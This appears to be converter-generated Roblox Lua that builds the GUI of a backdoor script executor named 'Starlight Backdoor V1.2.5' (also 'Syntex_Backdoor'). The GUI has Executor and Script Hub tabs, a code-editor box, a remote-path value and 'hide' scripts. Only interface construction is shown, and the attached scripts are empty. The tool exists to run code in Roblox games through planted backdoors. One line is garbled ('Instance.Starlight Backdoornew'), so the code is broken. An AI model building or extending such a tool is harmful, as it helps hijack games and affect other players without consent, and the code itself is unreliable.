--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 361 | Scripts: 71 | Modules: 1 | Tags: 0
local G2L = {};

-- StarterGui.Syntex_Backdoor
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[Syntex_Backdoor]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5
G2L["2"] = Instance.Starlight Backdoornew("Folder", G2L["1"]);
G2L["2"]["Name"] = [[sb_v1.2.5]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts
G2L["3"] = Instance.new("Folder", G2L["2"]);
G2L["3"]["Name"] = [[mainScripts]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.LogoH
G2L["4"] = Instance.new("LocalScript", G2L["3"]);
G2L["4"]["Name"] = [[LogoH]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.LogoH.olleH
G2L["5"] = Instance.new("BindableEvent", G2L["4"]);
G2L["5"]["Name"] = [[olleH]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.hideExecutor
G2L["6"] = Instance.new("LocalScript", G2L["3"]);
G2L["6"]["Name"] = [[hideExecutor]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.UIDragMainContainer
G2L["7"] = Instance.new("LocalScript", G2L["3"]);
G2L["7"]["Name"] = [[UIDragMainContainer]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.clearIDE
G2L["8"] = Instance.new("LocalScript", G2L["3"]);
G2L["8"]["Name"] = [[clearIDE]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.hideIDE
G2L["9"] = Instance.new("LocalScript", G2L["3"]);
G2L["9"]["Name"] = [[hideIDE]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.mainScript
G2L["a"] = Instance.new("LocalScript", G2L["3"]);
G2L["a"]["Name"] = [[mainScript]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.remotePath
G2L["b"] = Instance.new("StringValue", G2L["3"]);
G2L["b"]["Name"] = [[remotePath]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI
G2L["c"] = Instance.new("Folder", G2L["2"]);
G2L["c"]["Name"] = [[UI]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer
G2L["d"] = Instance.new("Frame", G2L["c"]);
G2L["d"]["Visible"] = false;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(215, 215, 215);
G2L["d"]["Size"] = UDim2.new(0, 937, 0, 285);
G2L["d"]["Position"] = UDim2.new(0.01297, 0, 0.04925, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[mainContainer]];
G2L["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer
G2L["e"] = Instance.new("Frame", G2L["d"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["e"]["Size"] = UDim2.new(0, 206, 0, 285);
G2L["e"]["Position"] = UDim2.new(-0.00059, 0, -0.001, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Name"] = [[buttonsContainer]];
G2L["e"]["BackgroundTransparency"] = 0.2;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.UICorner
G2L["f"] = Instance.new("UICorner", G2L["e"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.TextLabel
G2L["10"] = Instance.new("TextLabel", G2L["e"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 22;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["BackgroundTransparency"] = 1;
G2L["10"]["Size"] = UDim2.new(0, 162, 0, 36);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[Starlight Backdoor]];
G2L["10"]["Position"] = UDim2.new(0.11334, 0, 0.07018, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.UIGradient
G2L["11"] = Instance.new("UIGradient", G2L["e"]);
G2L["11"]["Rotation"] = 132;
G2L["11"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.UIGradient.LocalScript
G2L["12"] = Instance.new("LocalScript", G2L["11"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2
G2L["13"] = Instance.new("Frame", G2L["e"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["13"]["Size"] = UDim2.new(0, 172, 0, 177);
G2L["13"]["Position"] = UDim2.new(0.08738, 0, 0.28971, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[bc2]];
G2L["13"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.UICorner
G2L["14"] = Instance.new("UICorner", G2L["13"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.UIStroke
G2L["15"] = Instance.new("UIStroke", G2L["13"]);
G2L["15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["15"]["Thickness"] = 2;
G2L["15"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB
G2L["16"] = Instance.new("TextButton", G2L["13"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["16"]["TextSize"] = 14;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 157, 0, 34);
G2L["16"]["Name"] = [[HomeB]];
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Home]];
G2L["16"]["Position"] = UDim2.new(0.05456, 0, 0.04884, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB.LocalScript
G2L["17"] = Instance.new("LocalScript", G2L["16"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB.anim
G2L["18"] = Instance.new("LocalScript", G2L["16"]);
G2L["18"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB.UIStroke
G2L["19"] = Instance.new("UIStroke", G2L["16"]);
G2L["19"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["19"]["Thickness"] = 2;
G2L["19"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.HomeB.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["16"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB
G2L["1b"] = Instance.new("TextButton", G2L["13"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["1b"]["Size"] = UDim2.new(0, 157, 0, 34);
G2L["1b"]["Name"] = [[ExecutorB]];
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[Executor]];
G2L["1b"]["Position"] = UDim2.new(0.05456, 0, 0.29203, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB.LocalScript
G2L["1c"] = Instance.new("LocalScript", G2L["1b"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB.anim
G2L["1d"] = Instance.new("LocalScript", G2L["1b"]);
G2L["1d"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB.UIStroke
G2L["1e"] = Instance.new("UIStroke", G2L["1b"]);
G2L["1e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1e"]["Thickness"] = 2;
G2L["1e"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ExecutorB.UICorner
G2L["1f"] = Instance.new("UICorner", G2L["1b"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB
G2L["20"] = Instance.new("TextButton", G2L["13"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["20"]["TextSize"] = 14;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["20"]["Size"] = UDim2.new(0, 157, 0, 34);
G2L["20"]["Name"] = [[ScriptHubB]];
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[Script Hub]];
G2L["20"]["Position"] = UDim2.new(0.05456, 0, 0.52807, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB.LocalScript
G2L["21"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB.anim
G2L["22"] = Instance.new("LocalScript", G2L["20"]);
G2L["22"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB.UIStroke
G2L["23"] = Instance.new("UIStroke", G2L["20"]);
G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["23"]["Thickness"] = 2;
G2L["23"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.ScriptHubB.UICorner
G2L["24"] = Instance.new("UICorner", G2L["20"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB
G2L["25"] = Instance.new("TextButton", G2L["13"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["25"]["TextSize"] = 14;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["25"]["Size"] = UDim2.new(0, 157, 0, 34);
G2L["25"]["Name"] = [[SettingsB]];
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Settings]];
G2L["25"]["Position"] = UDim2.new(0.05456, 0, 0.76781, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB.LocalScript
G2L["26"] = Instance.new("LocalScript", G2L["25"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB.anim
G2L["27"] = Instance.new("LocalScript", G2L["25"]);
G2L["27"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB.UIStroke
G2L["28"] = Instance.new("UIStroke", G2L["25"]);
G2L["28"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["28"]["Thickness"] = 2;
G2L["28"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.bc2.SettingsB.UICorner
G2L["29"] = Instance.new("UICorner", G2L["25"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.UIStroke
G2L["2a"] = Instance.new("UIStroke", G2L["e"]);
G2L["2a"]["Transparency"] = 0.5;
G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2a"]["Thickness"] = 2;
G2L["2a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.Frame
G2L["2b"] = Instance.new("Frame", G2L["e"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["2b"]["Size"] = UDim2.new(0, 172, 0, 3);
G2L["2b"]["Position"] = UDim2.new(0.09878, 0, 0.22105, 0);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.buttonsContainer.Frame.UICorner
G2L["2c"] = Instance.new("UICorner", G2L["2b"]);
G2L["2c"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor
G2L["2d"] = Instance.new("Frame", G2L["d"]);
G2L["2d"]["Visible"] = false;
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["Size"] = UDim2.new(0, 718, 0, 285);
G2L["2d"]["Position"] = UDim2.new(0.23553, 0, -0.001, 0);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Name"] = [[Executor]];
G2L["2d"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer
G2L["2e"] = Instance.new("Frame", G2L["2d"]);
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["2e"]["Size"] = UDim2.new(0, 512, 0, 285);
G2L["2e"]["Position"] = UDim2.new(-0.00174, 0, 0.00093, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Name"] = [[ideContainer]];
G2L["2e"]["BackgroundTransparency"] = 0.1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.numbersContainer
G2L["2f"] = Instance.new("ScrollingFrame", G2L["2e"]);
G2L["2f"]["Active"] = true;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["CanvasSize"] = UDim2.new(0, 0, 1, 0);
G2L["2f"]["ScrollingEnabled"] = false;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["2f"]["Name"] = [[numbersContainer]];
G2L["2f"]["Size"] = UDim2.new(0, 30, 0, 205);
G2L["2f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Position"] = UDim2.new(0.043, 0, 0.054, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["ScrollBarThickness"] = 0;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.numbersContainer.UIStroke
G2L["30"] = Instance.new("UIStroke", G2L["2f"]);
G2L["30"]["Thickness"] = 2;
G2L["30"]["Color"] = Color3.fromRGB(55, 55, 55);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.numbersContainer.tempate
G2L["31"] = Instance.new("TextLabel", G2L["2f"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 14;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Size"] = UDim2.new(0, 30, 0, 10);
G2L["31"]["Visible"] = false;
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[1]];
G2L["31"]["Name"] = [[tempate]];
G2L["31"]["Position"] = UDim2.new(0, 0, 0.02713, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.numbersContainer.UICorner
G2L["32"] = Instance.new("UICorner", G2L["2f"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll
G2L["33"] = Instance.new("ScrollingFrame", G2L["2e"]);
G2L["33"]["Active"] = true;
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["CanvasSize"] = UDim2.new(0, 0, 1, 0);
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["33"]["Name"] = [[ideScroll]];
G2L["33"]["Size"] = UDim2.new(0, 434, 0, 205);
G2L["33"]["Position"] = UDim2.new(0.129, 0, 0.054, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["ScrollBarThickness"] = 5;
G2L["33"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.H_Handler
G2L["34"] = Instance.new("LocalScript", G2L["33"]);
G2L["34"]["Name"] = [[H_Handler]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide
G2L["35"] = Instance.new("TextBox", G2L["33"]);
G2L["35"]["Name"] = [[ide]];
G2L["35"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextWrapped"] = true;
G2L["35"]["TextTransparency"] = 1;
G2L["35"]["TextSize"] = 14;
G2L["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["35"]["RichText"] = true;
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["35"]["MultiLine"] = true;
G2L["35"]["ClearTextOnFocus"] = false;
G2L["35"]["PlaceholderText"] = [[-- Script here R00GEMANs <3]];
G2L["35"]["Size"] = UDim2.new(0, 418, 0, 5570);
G2L["35"]["Position"] = UDim2.new(0.013, 0, 0, 8);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[-- Starlight Backdoor V1.2.5 Made By @Rarbw14
-- Thanks R00GEMANs for using! <3]];
G2L["35"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.size
G2L["36"] = Instance.new("LocalScript", G2L["35"]);
G2L["36"]["Name"] = [[size]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.numbers
G2L["37"] = Instance.new("LocalScript", G2L["35"]);
G2L["37"]["Name"] = [[numbers]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.SrolSYNC
G2L["38"] = Instance.new("LocalScript", G2L["35"]);
G2L["38"]["Name"] = [[SrolSYNC]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.UICorner
G2L["39"] = Instance.new("UICorner", G2L["35"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.ide.HLabel
G2L["3a"] = Instance.new("TextLabel", G2L["35"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(0, 418, 0, 5570);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Name"] = [[HLabel]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["33"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.ideScroll.UIStroke
G2L["3c"] = Instance.new("UIStroke", G2L["33"]);
G2L["3c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3c"]["Thickness"] = 2;
G2L["3c"]["Color"] = Color3.fromRGB(46, 46, 46);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.UIGradient
G2L["3d"] = Instance.new("UIGradient", G2L["2e"]);
G2L["3d"]["Rotation"] = 132;
G2L["3d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 18))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.UIGradient.LocalScript
G2L["3e"] = Instance.new("LocalScript", G2L["3d"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.UICorner
G2L["3f"] = Instance.new("UICorner", G2L["2e"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.UIStroke
G2L["40"] = Instance.new("UIStroke", G2L["2e"]);
G2L["40"]["Transparency"] = 0.5;
G2L["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["40"]["Thickness"] = 2;
G2L["40"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.galaxyThemeGradient
G2L["41"] = Instance.new("UIGradient", G2L["2e"]);
G2L["41"]["Enabled"] = false;
G2L["41"]["Rotation"] = 132;
G2L["41"]["Name"] = [[galaxyThemeGradient]];
G2L["41"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 18, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.galaxyThemeGradient.LocalScript
G2L["42"] = Instance.new("LocalScript", G2L["41"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.lunarThemeGradient
G2L["43"] = Instance.new("UIGradient", G2L["2e"]);
G2L["43"]["Enabled"] = false;
G2L["43"]["Rotation"] = 132;
G2L["43"]["Name"] = [[lunarThemeGradient]];
G2L["43"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.lunarThemeGradient.LocalScript
G2L["44"] = Instance.new("LocalScript", G2L["43"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame
G2L["45"] = Instance.new("Frame", G2L["2e"]);
G2L["45"]["Visible"] = false;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["45"]["Size"] = UDim2.new(0, 512, 0, 285);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Name"] = [[saveScriptFrame]];
G2L["45"]["BackgroundTransparency"] = 0.2;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.UIStroke
G2L["46"] = Instance.new("UIStroke", G2L["45"]);
G2L["46"]["Transparency"] = 0.5;
G2L["46"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["46"]["Thickness"] = 2;
G2L["46"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.UICorner
G2L["47"] = Instance.new("UICorner", G2L["45"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName
G2L["48"] = Instance.new("Frame", G2L["45"]);
G2L["48"]["BorderSizePixel"] = 0;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["48"]["Size"] = UDim2.new(0, 300, 0, 159);
G2L["48"]["Position"] = UDim2.new(0.20703, 0, 0.20702, 0);
G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["Name"] = [[scriptName]];
G2L["48"]["BackgroundTransparency"] = 0.45;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.UIStroke
G2L["49"] = Instance.new("UIStroke", G2L["48"]);
G2L["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["49"]["Thickness"] = 2;
G2L["49"]["Color"] = Color3.fromRGB(44, 44, 44);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.UICorner
G2L["4a"] = Instance.new("UICorner", G2L["48"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.TextLabel
G2L["4b"] = Instance.new("TextLabel", G2L["48"]);
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["TextSize"] = 22;
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["4b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["BackgroundTransparency"] = 1;
G2L["4b"]["Size"] = UDim2.new(0, 146, 0, 36);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Text"] = [[Enter Script Name]];
G2L["4b"]["Position"] = UDim2.new(0.2558, 0, 0.07355, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.TextBox
G2L["4c"] = Instance.new("TextBox", G2L["48"]);
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["TextSize"] = 32;
G2L["4c"]["TextColor3"] = Color3.fromRGB(230, 230, 230);
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["4c"]["Size"] = UDim2.new(0, 233, 0, 50);
G2L["4c"]["Position"] = UDim2.new(0.11, 0, 0.34591, 0);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["Text"] = [[]];
G2L["4c"]["BackgroundTransparency"] = 0.95;


